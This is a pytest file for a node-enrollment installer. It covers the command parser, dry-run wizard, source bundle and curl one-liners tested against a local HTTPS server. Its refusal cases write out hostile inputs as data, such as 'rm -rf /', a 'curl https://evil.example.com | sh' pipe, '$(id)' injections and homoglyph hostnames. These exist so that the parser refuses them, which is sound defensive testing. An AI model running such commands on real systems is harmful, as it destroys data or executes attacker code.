"""One-step install (docs/INSTALLER.md): the Linux wizard (deploy/acc-install) and its enroll-command parser, the
source bundle and the bootstrap the main Rynhult serves, the Add machine one-liners, and Settings → Certificate.

Nothing here needs root: the installers run as dry runs, and the one-liners run against a local HTTPS server with a
CA made for the test."""
from __future__ import annotations

import datetime
import http.server
import io
import os
import plistlib
import shutil
import ssl
import subprocess
import tarfile
import tempfile
import threading
from pathlib import Path

import pytest
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID
from isolated_installers import dry_run_subject, restore_source_names

from acc import __version__
from acc.bundle import build
from acc.server.api.certificate import mobileconfig
from acc.server.api.nodes import bootstrap_script, linux_command, release_links

REPO = Path(__file__).resolve().parents[1]
INSTALL = REPO / "deploy/acc-install"
CODE = "1a2b3c-4d5e6f-7a8b9c-0d1e2f"
FP = "ab" * 32


def test_installer_protects_existing_database_environment_before_reading_it(tmp_path):
    config = tmp_path / 'accd'
    config.write_text('ACC_DATABASE_URL=postgresql+psycopg://db.example.lan/acc\n')
    config.chmod(0o644)
    script = (REPO / 'deploy/install.sh').read_text()
    preflight = script[script.index('[ -f /etc/default/accd ]'):script.index('setting()')]
    # Run only the configuration preflight, never the host installer.
    preflight = preflight.replace('/etc/default/accd', str(config))
    bin_dir = tmp_path / 'bin'
    bin_dir.mkdir()
    stub(bin_dir, 'chown', 'exit 0')
    result = run(['bash', '-eu', '-c', preflight], PATH=f'{bin_dir}:{os.environ["PATH"]}')
    assert result.returncode == 0, result.stderr
    assert config.stat().st_mode & 0o777 == 0o600


def run(cmd, timeout=120, **env) -> subprocess.CompletedProcess:
    environment = {**os.environ, **env}
    with dry_run_subject(cmd, environment) as (command, replacements):
        result = subprocess.run(command, capture_output=True, text=True, env=environment, timeout=timeout,
                                stdin=subprocess.DEVNULL)
        return restore_source_names(result, replacements)


def parse(text: str) -> subprocess.CompletedProcess:
    """Source the wizard (it runs nothing when sourced) and call its parser."""
    script = ('source "$1"; parse_enroll_command "$2" || exit 1; '
              'printf "%s|%s|%s|%s|%s" "$ENROLL_PRIMARY" "$ENROLL_TRUST" "$ENROLL_FINGERPRINT" "$ENROLL_CODE" '
              '"$ENROLL_NAME"')
    return run(["bash", "-c", script, "-", str(INSTALL), text])


def stub(directory: Path, name: str, body: str) -> None:
    path = directory / name
    path.write_text("#!/bin/sh\n" + body + "\n")
    path.chmod(0o755)


# Appended to a fake: writes the command line of that process and of each ancestor up to init, from /proc, to
# $ACC_TEST_ARGV, one per line. The one-time code must be in none of them (process list, sudo's log).
ARGV_RECORDER = ('pid=$$; while [ "$pid" -gt 1 ] 2>/dev/null; do '
                 'tr "\\0" " " < /proc/$pid/cmdline >> "$ACC_TEST_ARGV" 2>/dev/null; echo >> "$ACC_TEST_ARGV"; '
                 'pid=$(sed -n "s/^PPid:[[:space:]]*//p" /proc/$pid/status 2>/dev/null); done\n')


def paste(line: str, timeout=120, **env) -> subprocess.CompletedProcess:
    """Run a line as if pasted into a terminal: sh reads it from stdin, so the line itself is in no argv."""
    return subprocess.run(["sh"], input=line + "\n", capture_output=True, text=True, env={**os.environ, **env},
                          timeout=timeout)


def argv_chain(path: Path) -> str:
    text = path.read_text()
    assert "/proc" not in text and text.count("\n") >= 3, text  # the recorder ran and walked up the chain
    return text


@pytest.fixture
def stubs(tmp_path):
    """First on PATH: a uv that does nothing (dry runs never call it) and a sudo that just runs the command."""
    bin_dir = tmp_path / "stub-bin"
    bin_dir.mkdir()
    stub(bin_dir, "uv", "exit 0")
    stub(bin_dir, "sudo", 'exec "$@"')
    return bin_dir


# ------------------------------------------------------------------------------------------------ the parser --


def test_scripts_pass_shellcheck():
    if not shutil.which("shellcheck"):
        pytest.skip("shellcheck not installed")
    bash = [INSTALL, REPO / "deploy/setup.sh", REPO / "deploy/install.sh", REPO / "deploy/node/install.sh",
            *sorted((REPO / "deploy/lib").glob("*.sh")), REPO / "deploy/broker/acc-agent-share"]
    result = run(["shellcheck", *map(str, bash)])
    assert result.returncode == 0, result.stdout
    result = run(["shellcheck", "-s", "sh", str(REPO / "src/acc/server/node_bootstrap.sh")])
    assert result.returncode == 0, result.stdout


def test_node_settings_reader_is_staged_for_root_even_from_a_user_checkout(tmp_path):
    wrapper = tmp_path / 'python'
    wrapper.write_text("""#!/usr/bin/python3 -I
import os,runpy,sys
from pathlib import Path
real = Path.stat
def root_stat(path, *args, **kwargs):
    info = real(path, *args, **kwargs)
    return os.stat_result((*tuple(info)[:4], 0, 0, *tuple(info)[6:]))
Path.stat = root_stat
os.geteuid = lambda: 0
script = sys.argv.pop(1)
sys.argv[0] = script
runpy.run_path(script, run_name='__main__')
""")
    wrapper.chmod(0o755)
    script = (REPO / 'deploy/node/install.sh').read_text()
    reader = script[script.index('reader_args=()'):script.index('while IFS= read -r pair;')]
    reader = reader.replace('/usr/bin/python3 -I ', f'"{wrapper}" ')
    # Only the account-reading preflight runs; never execute the host installer.
    result = run(['bash', '-eu', '-c', 'REPO=$1; BROKER_ENV=$2; DRY=1;\n' + reader,
                  'test', str(REPO), str(tmp_path / 'missing')])
    assert result.returncode == 0, result.stderr


def test_main_setup_copy_removes_group_write_before_root_imports(tmp_path):
    source, target, tools = (tmp_path / name for name in ('checkout', 'app', 'bin'))
    for path in (source, target, tools):
        path.mkdir()
    (source / 'module.py').write_text('reviewed code')
    (source / 'module.py').chmod(0o664)
    source.chmod(0o775)
    stub(tools, 'rsync', '/bin/cp -a "$REPO/." "$APP/"')
    stub(tools, 'chown', 'exit 0')
    script = (REPO / 'deploy/setup.sh').read_text()
    start = script.index('    rsync -a --exclude=')
    end = script.index('    chmod -R go-w "$APP"', start) + len('    chmod -R go-w "$APP"')
    copy = script[start:end]
    result = run(['bash', '-eu', '-c', copy], REPO=str(source), APP=str(target),
                 PATH=f'{tools}:{os.environ["PATH"]}')
    assert result.returncode == 0, result.stderr
    assert not target.stat().st_mode & 0o022
    assert not (target / 'module.py').stat().st_mode & 0o022


async def test_the_parser_accepts_what_add_machine_shows(api, env, tmp_path):
    object.__setattr__(api.app.state.ctx.settings, "allowed_origins", ("https://acc.example.lan",))
    for name, configure in (("pub", None), ("priv", tmp_path / "root.pem")):
        if configure:
            configure.write_bytes(make_ca("Test Root")[1].public_bytes(serialization.Encoding.PEM))
            object.__setattr__(api.app.state.ctx.settings, "node_ca_file", configure)
        added = (await api.post("/api/nodes", json={"name": name})).json()
        result = parse(added["command"])
        assert result.returncode == 0, result.stderr
        primary, trust, fingerprint, code, got_name = result.stdout.split("|")
        assert (primary, trust, code, got_name) == (added["primary"], added["trust"], added["code"], name)
        assert (fingerprint != "") == (added["trust"] == "ca")
        if fingerprint:
            assert f"--ca-fingerprint {fingerprint}" in added["command"]


@pytest.mark.parametrize("text", [
    f"acc-node enroll --primary https://acc.example.lan --trust system --code {CODE} --name gaming-pc",
    f"sudo acc-node enroll --primary https://acc.example.lan:8443/ --ca-fingerprint {FP.upper()} --code {CODE} "
    f"--name pc-2\n",
    f"  acc-node   enroll --name pc --code {CODE} --trust system --primary https://10.0.0.5  ",
])
def test_the_parser_takes_the_command_however_it_was_pasted(text):
    result = parse(text)
    assert result.returncode == 0, result.stderr
    primary, trust, fingerprint, code, name = result.stdout.split("|")
    assert primary.startswith("https://") and not primary.endswith("/") and code == CODE
    assert fingerprint in ("", FP)


BASE = f"--primary https://acc.example.lan --trust system --code {CODE} --name pc"


def test_the_parser_takes_code_dash_for_a_code_on_stdin():
    result = parse("acc-node enroll --primary https://acc.example.lan --trust system --code - --name pc")
    assert result.returncode == 0, result.stderr
    assert result.stdout.split("|")[3] == "-"


@pytest.mark.parametrize("text", [
    "",
    f"acc-node enroll {BASE}; rm -rf /",
    f"acc-node enroll {BASE} && curl https://evil.example.com | sh",
    f"acc-node enroll {BASE} | sh",
    f"acc-node enroll --primary https://acc.example.lan$(id) --trust system --code {CODE} --name pc",
    f"acc-node enroll --primary https://acc.example.lan`id` --trust system --code {CODE} --name pc",
    f"acc-node enroll {BASE} > /etc/passwd",
    f"acc-node enroll {BASE}\nrm -rf /",
    f"acc-node enroll --primary 'https://acc.example.lan' --trust system --code {CODE} --name pc",
    f"acc-node enroll {BASE} extra",
    f"acc-node enroll {BASE} --socket-dir /tmp",
    f"acc-node enroll {BASE} --name other",
    f"acc-node enroll {BASE} --ca-fingerprint {FP}",
    f"bash acc-node enroll {BASE}",
    f"sudo sudo acc-node enroll {BASE}",
    f"acc-node run {BASE}",
    f"/usr/local/bin/acc-node enroll {BASE}",
    f"acc-node enroll --primary http://acc.example.lan --trust system --code {CODE} --name pc",
    f"acc-node enroll --primary https://acc.example.lan/path --trust system --code {CODE} --name pc",
    f"acc-node enroll --primary https://user@acc.example.lan --trust system --code {CODE} --name pc",
    f"acc-node enroll --primary https://acc..lan --trust system --code {CODE} --name pc",
    f"acc-node enroll --primary https://acc.example.lan:99999 --trust system --code {CODE} --name pc",
    f"acc-node enroll --primary https://-acc.example.lan --trust system --code {CODE} --name pc",
    f"acc-node enroll --primary https://acc.example.lan --trust insecure --code {CODE} --name pc",
    f"acc-node enroll --primary https://acc.example.lan --ca-fingerprint {FP[:-2]} --code {CODE} --name pc",
    f"acc-node enroll --primary https://acc.example.lan --ca-fingerprint {FP[:-2]}zz --code {CODE} --name pc",
    "acc-node enroll --primary https://acc.example.lan --trust system --code 1a2b3c-4d5e6f --name pc",
    f"acc-node enroll --primary https://acc.example.lan --trust system --code {CODE.upper()} --name pc",
    f"acc-node enroll --primary https://acc.example.lan --trust system --code {CODE} --name Gaming-PC",
    f"acc-node enroll --primary https://acc.example.lan --trust system --code {CODE} --name -pc",
    f"acc-node enroll --primary https://acc.example.lan --trust system --code {CODE} --name local",
    f"acc-node enroll --primary https://acc.example.lan --trust system --code {CODE} --name {'a' * 41}",
    f"acc-node enroll --primary https://acc.example.lan --trust system --code {CODE}",
    "acc-node enroll --primary https://acc.example.lan --trust system --code",
    f"acc-node enroll --primary https://acc.example.lan --code {CODE} --name pc",
    f"acc-node enroll --primary=https://acc.example.lan --trust system --code {CODE} --name pc",
    f"acc-node enroll {BASE} " + "x" * 600,
])
def test_the_parser_refuses_anything_else(text):
    result = parse(text)
    assert result.returncode == 1 and result.stdout == "" and result.stderr, (text, result.stdout)


# ---------------------------------------------------------------------------------------------- dry runs --


def test_main_dry_run_passes_the_answers_to_setup(tmp_path):
    result = run(["bash", str(INSTALL), "--main", "--yes", "--dry-run"], ACC_SETUP_TEST_ACCD=str(tmp_path / "none"),
                 ACC_OWNER="nobody", ACC_HOSTNAME="acc.example.lan", ACC_AGENT_CLIS="codex copilot",
                 ACC_OLLAMA="no", ACC_DOCKER="no", SUDO_USER="")
    out = result.stdout
    assert result.returncode == 0, out + result.stderr
    assert "(dry run: nothing is changed)" in out
    assert f"+ {REPO}/deploy/setup.sh --yes --dry-run" in out
    for line in ("ACC_ALLOWED_ORIGINS=https://acc.example.lan", "ACC_SERVICES_ACCOUNT=nobody",
                 'ACC_AGENT_CLIS="codex copilot"', "Caddy, signing Rynhult's certificate with its own CA",
                 "Dry run done: nothing was changed"):
        assert line in out, line
    assert "rootless Docker" not in out


def test_node_dry_run_installs_then_enrolls_with_the_parsed_values(stubs):
    command = f"rynhult-node enroll --primary https://acc.example.lan --ca-fingerprint {FP} --code {CODE} --name pc"
    result = run(["bash", str(INSTALL), "--node", command, "--dry-run"], PATH=f"{stubs}:{os.environ['PATH']}")
    out = result.stdout
    assert result.returncode in (0, 2), out + result.stderr  # 2: this machine can't be a node (it's the primary)
    assert result.returncode == (2 if "WOULD FAIL" in out else 0)
    assert f"{REPO}/deploy/node/install.sh --install-prereqs --dry-run" in out
    assert "uv sync --frozen --no-dev" in out and "deploy/acc-install enrolls it next" in out
    assert out.rstrip().endswith(f"+ /usr/local/bin/acc-node enroll --primary https://acc.example.lan "
                                 f"--ca-fingerprint {FP} --code - --name pc")


def test_the_wizard_refuses_bad_input_without_running_anything(stubs):
    bad = run(["bash", str(INSTALL), "--node", f"acc-node enroll {BASE}; reboot", "--dry-run"])
    assert bad.returncode == 2 and "characters it never contains" in bad.stderr and "+ " not in bad.stdout
    assert run(["bash", str(INSTALL), "--yes", "--dry-run"]).returncode == 2  # no role, no terminal
    assert run(["bash", str(INSTALL), "--frobnicate"]).returncode == 2
    if os.getuid() != 0:
        real = run(["bash", str(INSTALL), "--node", f"acc-node enroll {BASE}"])
        assert real.returncode == 1 and "run as root" in real.stderr


@pytest.fixture
def wizard(tmp_path):
    """The wizard's node step for real, sourced, with a fake node installer and a fake acc-node that records its
    arguments, its stdin and the command lines above it."""
    repo = tmp_path / "repo"
    (repo / "deploy/node").mkdir(parents=True)
    stub(repo / "deploy/node", "install.sh", "exit 0")
    record, argv = tmp_path / "record", tmp_path / "argv"
    node = tmp_path / "acc-node"
    node.write_text('#!/bin/sh\nprintf "%s\\n" "$*" >> "$ACC_TEST_RECORD"\n'
                    'IFS= read -r code; printf "stdin %s\\n" "$code" >> "$ACC_TEST_RECORD"\n' + ARGV_RECORDER)
    node.chmod(0o755)

    def call(command: str, stdin: str, prelude: str = "") -> subprocess.CompletedProcess:
        script = (f'source "$1"; REPO=$2 ACC_NODE=$3 LOG=$4 DRY= WT= INTERACTIVE=0 NODE_COMMAND=$5; {prelude} '
                  'node_role')
        return subprocess.run(["bash", "-c", script, "-", str(INSTALL), str(repo), str(node), str(tmp_path / "log"),
                               command], input=stdin, capture_output=True, text=True, timeout=60,
                              env={**os.environ, "ACC_TEST_RECORD": str(record), "ACC_TEST_ARGV": str(argv)})
    return call, record, argv


def test_the_wizard_reads_a_dash_code_from_stdin_and_pipes_it_to_acc_node(wizard):
    call, record, argv = wizard
    result = call(f"rynhult-node enroll --primary https://acc.example.lan --ca-fingerprint {FP} --code - --name pc",
                  CODE + "\n")
    assert result.returncode == 0, result.stdout + result.stderr
    assert record.read_text().splitlines() == [
        f"enroll --primary https://acc.example.lan --ca-fingerprint {FP} --code - --name pc", f"stdin {CODE}"]
    assert CODE not in argv_chain(argv)  # not acc-node's, nor the wizard's, nor anything above them
    assert CODE not in result.stdout + result.stderr


def test_the_wizard_pipes_a_pasted_code_to_acc_node_too(wizard):
    call, record, argv = wizard
    result = call(f"acc-node enroll --primary https://acc.example.lan --trust system --code {CODE} --name pc", "")
    assert result.returncode == 0, result.stdout + result.stderr
    assert record.read_text().splitlines() == [
        "enroll --primary https://acc.example.lan --trust system --code - --name pc", f"stdin {CODE}"]
    chain = argv_chain(argv).splitlines()
    assert CODE not in chain[0]  # acc-node's own command line
    assert any(CODE in line for line in chain[1:])  # the recorder does see a code above it: here the wizard's --node


@pytest.mark.parametrize("stdin", ["", "\n", "1a2b3c\n", f"{CODE.upper()}\n", f"{CODE}; reboot\n"])
def test_the_wizard_refuses_a_missing_or_odd_code_on_stdin(wizard, stdin):
    call, record, argv = wizard
    result = call("acc-node enroll --primary https://acc.example.lan --trust system --code - --name pc", stdin)
    assert result.returncode == 2 and "one-time code on one line of stdin" in result.stderr
    assert not record.exists()


def test_the_interactive_wizard_wants_the_code_in_the_pasted_command(wizard):
    call, record, argv = wizard
    dash = "acc-node enroll --primary https://acc.example.lan --trust system --code - --name pc"
    prelude = (f'answers=("{dash}" "{dash.replace("--code -", "--code " + CODE)}"); n=0; '
               'ui_input() { printf -v "$1" %s "${answers[$n]}"; n=$((n + 1)); }; ui_msg() { echo "MSG: $*"; }; '
               'NODE_COMMAND= INTERACTIVE=1;')
    result = call("", "", prelude)
    assert result.returncode == 0, result.stdout + result.stderr
    assert "MSG: That isn't the Add machine command: paste it with its code, not --code -" in result.stdout
    assert record.read_text().splitlines()[-1] == f"stdin {CODE}"


# ------------------------------------------------------------------------------------------------ the bundle --


def make_tree(root: Path) -> None:
    # Installed-tree fixture: checkout tests initialize real Git metadata explicitly.
    files = {
        "pyproject.toml": '[project]\nname = "acc"\nversion = "9.8.7"\n',
        "deploy/acc-install": "#!/bin/sh\n", "src/acc/x.py": "x = 1\n", "web/src/app.ts": "",
        ".venv/bin/python": "", "web/node_modules/a/index.js": "", "data/acc.db": "",
        "src/acc/__pycache__/x.cpython-312.pyc": "", "deploy/secrets/token": "", "secrets/key": "",
        "src/acc/server/static/index.html": "", ".env": "TOKEN=x", "local.db": "", ".pytest_cache/v": "",
        "catalog/skills/demo/data/kept.csv": "a,b\n", "deploy/accd.env.example": "ACC_X=\n",
    }
    for name, text in files.items():
        (root / name).parent.mkdir(parents=True, exist_ok=True)
        (root / name).write_text(text)
    (root / "deploy/acc-install").chmod(0o755)
    (root / "link").symlink_to("/etc/passwd")


def test_bundle_holds_the_source_and_nothing_local(tmp_path):
    tree = tmp_path / "tree"
    make_tree(tree)
    out = tmp_path / "bundle"
    out.mkdir()
    (out / "acc-1.0.0.tar.gz").write_bytes(b"old")
    target = build(tree, out)
    assert target == out / "acc-9.8.7.tar.gz" and sorted(p.name for p in out.iterdir()) == ["acc-9.8.7.tar.gz"]
    with tarfile.open(target) as tar:
        members = {m.name: m for m in tar.getmembers()}
    files = sorted(n.removeprefix("acc-9.8.7/") for n, m in members.items() if m.isfile())
    assert files == [".acc-build", "catalog/skills/demo/data/kept.csv", "deploy/acc-install", "deploy/accd.env.example",
                     "pyproject.toml", "src/acc/x.py", "web/src/app.ts"]
    assert all(n == "acc-9.8.7" or n.startswith("acc-9.8.7/") for n in members)
    assert all(m.isfile() or m.isdir() for m in members.values())  # the symlink is left out
    assert all(m.uid == 0 and m.gid == 0 and m.uname == "root" for m in members.values())
    assert members["acc-9.8.7/deploy/acc-install"].mode == 0o755
    assert members["acc-9.8.7/src/acc/x.py"].mode == 0o644


def test_bundle_from_a_git_checkout_holds_only_tracked_files(tmp_path):
    """The bundle is public: in a git checkout, a file that is merely lying there (scratch, a log, a key someone
    dropped in) never goes in, even where the skip lists wouldn't catch it."""
    tree = tmp_path / "tree"
    make_tree(tree)
    run(["git", "init", "-q", str(tree)])
    run(["git", "-C", str(tree), "add", "pyproject.toml", "src/acc/x.py", "deploy/acc-install"])
    (tree / "notes-private.txt").write_text("not for anyone")
    (tree / "src" / "acc" / "scratch.py").write_text("x = 1")
    with tarfile.open(build(tree, tmp_path / "out")) as tar:
        files = sorted(m.name.removeprefix("acc-9.8.7/") for m in tar.getmembers() if m.isfile())
    assert files == [".acc-build", "deploy/acc-install", "pyproject.toml", "src/acc/x.py"]


def test_bundle_builder_runs_with_the_system_python(tmp_path):
    """deploy/install.sh runs it as `python3 -I src/acc/bundle.py` (standard library only)."""
    tree = tmp_path / "tree"
    make_tree(tree)
    result = run(["/usr/bin/python3", "-I", str(REPO / "src/acc/bundle.py"), "--source", str(tree),
                  "--out", str(tmp_path / "out")])
    assert result.returncode == 0, result.stderr
    assert (tmp_path / "out/acc-9.8.7.tar.gz").is_file()


def test_install_builds_the_bundle_and_copies_caddys_root():
    text = (REPO / "deploy/install.sh").read_text()
    assert '/usr/bin/python3 -I "$REPO/src/acc/bundle.py" --source "$REPO"' in text
    assert '"$REPO/deploy/lib/data-paths.py" bundle /srv/acc/data' in text
    assert "pki/authorities/local/root.crt" in text and "ACC_NODE_CA_FILE=$NODE_CA" in text
    signs = text.index("CADDY_SIGNS=1")
    assert text.rfind("else", 0, signs) > text.index("render wildcard.caddy.in")  # only the internal-CA branch


async def test_bundle_and_bootstrap_are_served_and_rate_limited(api, env):
    from test_auth import do_setup
    await do_setup(api, env)
    anonymous = type(api)(transport=api._transport, base_url="http://acc")
    assert (await anonymous.get("/api/nodes/bundle")).status_code == 404  # not built yet
    assert (await anonymous.get("/api/auth/state")).json().get("instance") is None
    settings = api.app.state.ctx.settings
    tree = settings.data_dir.parent / "tree"
    make_tree(tree)
    build(tree, settings.bundle_dir, version=__version__)
    assert (await api.get("/api/auth/state")).json()["instance"]["source_download"] == "/api/nodes/bundle"
    served = await anonymous.get("/api/nodes/bundle")
    assert served.status_code == 200 and served.headers["content-type"] == "application/gzip"
    assert f'filename="acc-{__version__}.tar.gz"' in served.headers["content-disposition"]
    with tarfile.open(fileobj=io.BytesIO(served.content)) as tar:
        assert f"acc-{__version__}/deploy/acc-install" in tar.getnames()
    script = await anonymous.get("/api/nodes/install.sh")
    assert script.status_code == 200 and f"VERSION='{__version__}'" in script.text
    statuses = [(await anonymous.get("/api/nodes/install.sh")).status_code for _ in range(30)]
    assert statuses[-1] == 429 and statuses.count(200) == 27  # 30 per 10 minutes, both routes together
    await anonymous.aclose()


def test_bootstrap_is_plain_sh():
    script = bootstrap_script("1.2.3")
    assert "@VERSION@" not in script and "VERSION='1.2.3'" in script
    result = subprocess.run(["sh", "-n"], input=script, capture_output=True, text=True)
    assert result.returncode == 0, result.stderr
    with pytest.raises(ValueError):
        bootstrap_script("1.2.3'; reboot; '")


async def test_add_machine_shows_the_one_liners_and_installers(api, env, tmp_path):
    object.__setattr__(api.app.state.ctx.settings, "allowed_origins", ("https://acc.example.lan",))
    object.__setattr__(api.app.state.ctx.settings, "source_url", "https://github.com/example-org/acc")
    pub = (await api.post("/api/nodes", json={"name": "pub"})).json()
    assert pub["linux"].startswith(f"echo {pub['code']} | sh -c 'set -e;") and pub["linux"].endswith(
        "' - https://acc.example.lan pub")
    assert pub["linux"].count(pub["code"]) == 1 and subprocess.run(["sh", "-n", "-c", pub["linux"]]).returncode == 0
    assert pub["version"] == __version__
    assert pub["installers"] == {}  # Pre-v1 tags do not build desktop installers.
    assert release_links("https://github.com/example-org/acc", "1.0.0")["mac"].endswith("/Rynhult-1.0.0.pkg")
    (tmp_path / "root.pem").write_bytes(make_ca("Test Root")[1].public_bytes(serialization.Encoding.PEM))
    object.__setattr__(api.app.state.ctx.settings, "node_ca_file", tmp_path / "root.pem")
    priv = (await api.post("/api/nodes", json={"name": "priv"})).json()
    fingerprint = priv["command"].split("--ca-fingerprint ")[1].split()[0]
    assert priv["linux"].startswith(f"echo {priv['code']} | sh -c '") and priv["linux"].endswith(
        f"' - https://acc.example.lan {fingerprint} priv")
    assert priv["linux"].count(priv["code"]) == 1
    assert subprocess.run(["sh", "-n", "-c", priv["linux"]]).returncode == 0
    assert release_links("https://git.example.com/fork/acc") == {}


@pytest.mark.parametrize("pin", [None, FP])
def test_linux_command_pipes_the_code_and_quotes_nothing_it_was_given(pin):
    line = linux_command("https://acc.example.lan:8443", pin, CODE, "pc-2")
    prefix = f"echo {CODE} | sh -c '"
    assert line.startswith(prefix) and line.count(CODE) == 1
    script, args = line[len(prefix):].split("' - ")
    assert "'" not in script and "--code - " in script and "sudo sh " in script
    assert args.split() == ["https://acc.example.lan:8443", *([pin] if pin else []), "pc-2"]
    assert " -k " not in script.replace("curl -fsSk --proto =https --max-filesize 65536 \"$1/api/nodes/ca\"", "")
    assert subprocess.run(["sh", "-n", "-c", line]).returncode == 0
    assert subprocess.run(["bash", "--posix", "-n", "-c", line]).returncode == 0


def test_linux_command_refuses_values_that_would_need_quoting():
    for primary, pin, code, name in (("https://acc.example.lan'", None, CODE, "pc"),
                                     ("https://acc.example.lan/x", None, CODE, "pc"),
                                     ("https://acc.example.lan", "zz" * 32, CODE, "pc"),
                                     ("https://acc.example.lan", None, CODE, "pc;id"),
                                     ("https://acc.example.lan", None, CODE, "pc\nid"),
                                     ("https://acc.example.lan", None, CODE, "`id`"),
                                     ("https://acc.example.lan", None, CODE, "$(id)"),
                                     ("https://acc.example.lan", None, "1a2b3c; id", "pc"),
                                     ("https://acc.example.lan", None, CODE + "\n", "pc"),
                                     ("https://аcc.example.lan", None, CODE, "pc"),  # Cyrillic а
                                     ("https://acc.example.lan", None, CODE, "pс")):  # Cyrillic с
        with pytest.raises(ValueError):
            linux_command(primary, pin, code, name)


# ----------------------------------------------------------- the one-liners against a local HTTPS server --


def make_ca(name: str):
    key = ec.generate_private_key(ec.SECP256R1())
    subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, name)])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder().subject_name(subject).issuer_name(subject).public_key(key.public_key())
            .serial_number(x509.random_serial_number()).not_valid_before(now - datetime.timedelta(minutes=5))
            .not_valid_after(now + datetime.timedelta(days=3650))
            .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
            .add_extension(x509.KeyUsage(digital_signature=True, key_cert_sign=True, crl_sign=True,
                                         content_commitment=False, key_encipherment=False, data_encipherment=False,
                                         key_agreement=False, encipher_only=False, decipher_only=False), critical=True)
            .add_extension(x509.SubjectKeyIdentifier.from_public_key(key.public_key()), critical=False)
            .sign(key, hashes.SHA256()))
    return key, cert


def make_leaf(ca_key, ca_cert, tmp: Path) -> tuple[Path, Path]:
    key = ec.generate_private_key(ec.SECP256R1())
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "localhost")]))
            .issuer_name(ca_cert.subject).public_key(key.public_key()).serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(minutes=5)).not_valid_after(now + datetime.timedelta(days=1))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName("localhost")]), critical=False)
            .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()), critical=False)
            .sign(ca_key, hashes.SHA256()))
    cert_path, key_path = tmp / "leaf.pem", tmp / "leaf.key"
    cert_path.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    key_path.write_bytes(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                                           serialization.NoEncryption()))
    return cert_path, key_path


def pem(cert) -> bytes:
    return cert.public_bytes(serialization.Encoding.PEM)


def fingerprint_of(cert) -> str:
    return cert.fingerprint(hashes.SHA256()).hex()


class FakePrimary:
    """An HTTPS server on localhost: /api/nodes/ca, /api/nodes/install.sh and /api/nodes/bundle, with whatever the
    test puts in `routes`; `hits` records the paths asked for."""

    def __init__(self, tmp: Path, signer=None):
        self.ca_key, self.ca = make_ca("Rynhult Test Root")
        signing_key, signing_cert = signer or (self.ca_key, self.ca)
        cert_path, key_path = make_leaf(signing_key, signing_cert, tmp)
        self.routes: dict[str, bytes] = {"/api/nodes/ca": pem(self.ca)}
        self.hits: list[str] = []
        outer = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                outer.hits.append(self.path)
                body = outer.routes.get(self.path)
                self.send_response(200 if body is not None else 404)
                self.send_header("Content-Length", str(len(body or b"")))
                self.end_headers()
                self.wfile.write(body or b"")

            def log_message(self, *args):
                pass

        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(cert_path, key_path)
        self.server.socket = context.wrap_socket(self.server.socket, server_side=True)
        self.url = f"https://localhost:{self.server.server_address[1]}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self):
        self.server.shutdown()
        self.server.server_close()


@pytest.fixture
def primary(tmp_path):
    if not (shutil.which("curl") and shutil.which("openssl")):
        pytest.skip("needs curl and openssl")
    server = FakePrimary(tmp_path)
    yield server
    server.close()


FAKE_BOOTSTRAP = (b'#!/bin/sh\nprintf "%s\\n" "$@" > "$ACC_TEST_ARGS"\n'
                  b'IFS= read -r code; printf "%s" "$code" > "$ACC_TEST_ARGS.stdin"\n' + ARGV_RECORDER.encode())


def test_private_ca_one_liner_runs_the_bootstrap_once_the_fingerprint_matches(primary, stubs, tmp_path):
    primary.routes["/api/nodes/install.sh"] = FAKE_BOOTSTRAP
    args = tmp_path / "args"
    line = linux_command(primary.url, fingerprint_of(primary.ca), CODE, "pc")
    result = paste(line, PATH=f"{stubs}:{os.environ['PATH']}", ACC_TEST_ARGS=str(args),
                   ACC_TEST_ARGV=str(tmp_path / "argv"))
    assert result.returncode == 0, result.stderr
    assert args.read_text().split() == ["--primary", primary.url, "--ca-fingerprint", fingerprint_of(primary.ca),
                                        "--code", "-", "--name", "pc"]
    assert Path(f"{args}.stdin").read_text() == CODE  # through sudo on stdin, so not in its log
    assert CODE not in argv_chain(tmp_path / "argv")
    assert primary.hits == ["/api/nodes/ca", "/api/nodes/install.sh"]


def test_public_one_liner_runs_the_bootstrap_with_the_code_on_stdin(primary, stubs, tmp_path):
    primary.routes["/api/nodes/install.sh"] = FAKE_BOOTSTRAP
    args, ca = tmp_path / "args", tmp_path / "system-ca.pem"
    ca.write_bytes(pem(primary.ca))  # --trust system: curl's own CA bundle, here the test CA
    result = paste(linux_command(primary.url, None, CODE, "pc"), PATH=f"{stubs}:{os.environ['PATH']}",
                   ACC_TEST_ARGS=str(args), ACC_TEST_ARGV=str(tmp_path / "argv"), CURL_CA_BUNDLE=str(ca))
    assert result.returncode == 0, result.stderr
    assert args.read_text().split() == ["--primary", primary.url, "--trust", "system", "--code", "-", "--name", "pc"]
    assert Path(f"{args}.stdin").read_text() == CODE
    assert CODE not in argv_chain(tmp_path / "argv")
    assert primary.hits == ["/api/nodes/install.sh"]
    # and without that bundle the self-signed server is refused before anything runs
    args.unlink()
    result = paste(linux_command(primary.url, None, CODE, "pc"), PATH=f"{stubs}:{os.environ['PATH']}",
                   ACC_TEST_ARGS=str(args), ACC_TEST_ARGV=str(tmp_path / "argv"))
    assert result.returncode != 0 and not args.exists()


def test_private_ca_one_liner_stops_on_another_ca(primary, stubs, tmp_path):
    primary.routes["/api/nodes/install.sh"] = FAKE_BOOTSTRAP
    line = linux_command(primary.url, "cd" * 32, CODE, "pc")
    result = run(["sh", "-c", line], PATH=f"{stubs}:{os.environ['PATH']}", ACC_TEST_ARGS=str(tmp_path / "args"))
    assert result.returncode != 0 and "fingerprint does not match" in result.stderr
